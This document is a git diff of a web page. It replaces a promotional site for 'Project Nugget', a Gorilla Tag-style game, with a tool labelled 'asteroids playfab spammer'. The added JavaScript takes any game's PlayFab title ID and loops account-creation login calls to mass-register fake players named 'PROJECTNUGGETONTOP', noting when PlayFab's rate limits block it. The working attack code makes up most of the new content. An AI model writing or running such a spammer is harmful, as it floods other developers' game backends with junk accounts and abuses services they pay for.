@@ -1,122 +1,77 @@
 <html lang="en">
 <head>
-  <link rel="icon" href="https://raw.githubusercontent.com/Project-Nugget/project-nugget.github.io/main/images/73226ab431f68bafc2ad57757318352d.png" type="image/png">
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Project Nugget</title>
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>asteroid.lol</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script type="importmap">
+        { "imports": { "config": "/config.js" } }
+    </script>
+    <style>
+        body {
+            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path d="M2 2 L14 14 M14 2 L2 14" stroke="purple" stroke-width="2"/></svg>') 8 8, auto;
+        }
+    </style>
 </head>
 <body>
-  <nav>
-    <div class="logo">
-      <img src="https://raw.githubusercontent.com/Project-Nugget/project-nugget.github.io/main/images/73226ab431f68bafc2ad57757318352d.png" alt="Project Nugget Logo" width="40" height="40">
-      <span>Project Nugget</span>
+    <div class="header">
+        <a href="#">playfab spammer</a>
+        <a>soon</a>
+        <a>soon</a>
+        <a>soon</a>
     </div>
-    <div class="nav-links">
-      <a href="https://www.meta.com/experiences/freaky-nugget/27442133125385525/" target="_blank">Download</a>
-      <a href="shop.html">Shop</a>
-      <a href="index.html">Home</a>
+    <div class="container">
+        <h1>asteroids playfab spammer</h1>
+        <label for="titleId">title id:</label>
+        <input type="text" id="titleIdInput" placeholder="type your title id here!" value="">
+        <label for="numUsers">accounts to make:</label>
+        <input type="number" id="numUsers" placeholder=1 value="1">
+        <button id="spamButton">launch</button>
+        <div id="status"></div>
     </div>
-  </nav>
+    <div id="footer"><b>asteroid.lol</b></div>
+    <script type="module">
+        document.getElementById('spamButton').addEventListener('click', async () => {
+            const titleId = document.getElementById('titleIdInput').value;
+            const numUsers = parseInt(document.getElementById('numUsers').value, 10);
+            const statusDiv = document.getElementById('status');
 
-  <main>
-    <section class="hero">
-      <div class="hero-content fade-in-element">
-        <h1>Project Nugget | Official Site</h1>
-        <p>Meet Project Nugget. A Gorilla Tag Copy with much features to explore.</p>
-        <div class="hero-buttons">
-          <button class="cta-button" onclick="document.querySelector('.game-preview').scrollIntoView({behavior: 'smooth'})">
-            Discover More
-          </button>
-          <button class="cta-button secondary" onclick="document.querySelector('.creator-opinions').scrollIntoView({behavior: 'smooth'})">
-            Creators Opinions
-          </button>
-        </div>
-      </div>
-      <div class="floating-nuggets"></div>
-    </section>
+            if (!titleId) {
+                statusDiv.textContent = 'please enter a title id first..!';
+                return;
+            }
 
-    <section class="trailer-section fade-in-element">
-      <div class="trailer-container">
-        <iframe width="560" height="315" src="https://www.youtube.com/embed/_yVw6MZIqC4?si=BLg9pHlfOfIq9mW8" 
-          title="YouTube video player" frameborder="0" 
-          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-          referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-      </div>
-    </section>
+            statusDiv.textContent = 'starting...';
 
-    <section class="game-preview">
-      <div class="features">
-        <div class="feature-card fade-in-element">
-          <div class="feature-image">
-            <img src="https://raw.githubusercontent.com/Project-Nugget/project-nugget.github.io/main/images/mods.png" alt="Built-in Mods">
-          </div>
-          <h3>Built-in Mods</h3>
-          <p>Ever wanted Gorilla Tag Mods? Now you can get them!</p>
-        </div>
-        
-        <div class="feature-card fade-in-element">
-          <div class="feature-image">
-            <img src="https://raw.githubusercontent.com/Project-Nugget/project-nugget.github.io/main/images/cool.png" alt="Good Lighting">
-          </div>
-          <h3>Good Lighting</h3>
-          <p>We have nice looking lighting!</p>
-        </div>
+            for (let i = 0; i < numUsers; i++) {
+                try {
+                    const response = await axios.post(`https://${titleId}.playfabapi.com/Client/LoginWithCustomID`, {
+                        CustomId: `asteroidtoolsontop${Date.now()}${i}`,
+                        CreateAccount: true,
+                        TitleId: titleId,
+                        InfoRequestParameters: {
+                            UserDisplayName: "PROJECTNUGGETONTOP",
+                        },
+                        OS: "ANDROID",
+                    });
 
-        <div class="feature-card fade-in-element">
-          <div class="feature-image">
-            <img src="https://raw.githubusercontent.com/Project-Nugget/project-nugget.github.io/main/images/cool2.png" alt="Frequent Updates">
-          </div>
-          <h3>Frequent Updates</h3>
-          <p>We offer updates which is pretty frequent!</p>
-        </div>
-      </div>
-    </section>
+                    if (response.data && response.data.data && response.data.data.SessionTicket) {
+                        statusDiv.textContent = `made player ${i + 1}/${numUsers}.`;
+                    } else {
+                        statusDiv.textContent = `failed on player ${i + 1}.`;
+                    }
+                } catch (error) {
+                    if (error.response && error.response.status === 429) {
+                        statusDiv.textContent = `player ${i + 1}/${numUsers} skipped cause of playfabs rate limitations, rip`;
+                    } else {
+                        statusDiv.textContent = `couldn't make player ${i + 1}.`;
+                    }
+                }
+            }
 
-    <section class="creator-opinions fade-in-element">
-      <h2>Creator Opinions</h2>
-      <div class="opinions-grid">
-        <div class="opinion-card fade-in-element">
-          <iframe width="560" height="315" src="https://www.youtube.com/embed/O55vnMx7Oao?si=wAFOsFHB1zlwDEB3" 
-            title="YouTube video player" frameborder="0" 
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-            referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-        </div>
-        <div class="opinion-card fade-in-element">
-          <iframe width="560" height="315" src="https://www.youtube.com/embed/Il-k3C9mYlU?si=d1G0JNAo3W06ZvFd" 
-            title="YouTube video player" frameborder="0" 
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-            referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-        </div>
-        <div class="opinion-card fade-in-element">
-          <iframe width="560" height="315" src="https://www.youtube.com/embed/Z1p3umaxVmA?si=N8MQcux4SPPiwLvr" 
-            title="YouTube video player" frameborder="0" 
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-            referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-        </div>
-      </div>
-    </section>
-
-    <section class="cta-section fade-in-element">
-      <div class="cta-content">
-        <h2>Ready to join the hype? It starts here.</h2>
-        <a href="https://www.meta.com/experiences/freaky-nugget/27442133125385525/" target="_blank" class="cta-button">Play Now</a>
-      </div>
-    </section>
-  </main>
-
-  <footer>
-    <div class="footer-content fade-in-element">
-      <div class="footer-section">
-        <h4>Connect</h4>
-        <a href="https://discord.gg/projectnugget" target="_blank">Discord</a>
-      </div>
-    </div>
-    <div class="footer-bottom">
-      <p>&copy; 2023 Project Nugget. All rights reserved.</p>
-    </div>
-  </footer>
-
-  <script src="app.js"></script>
+            statusDiv.textContent = 'done...!';
+        });
+    </script>
 </body>
 </html>
